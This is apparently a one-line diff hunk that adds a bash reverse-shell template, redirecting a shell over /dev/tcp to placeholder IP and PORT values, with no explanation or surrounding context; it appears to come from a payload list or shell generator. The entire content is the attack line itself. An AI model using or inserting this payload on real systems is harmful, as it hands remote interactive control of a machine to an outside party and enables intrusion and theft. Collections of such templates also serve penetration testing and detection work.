@@ -1,0 +1,1 @@
+0<&196;exec 196<>/dev/tcp/IP/PORT; SHELL <&196 >&196 2>&196
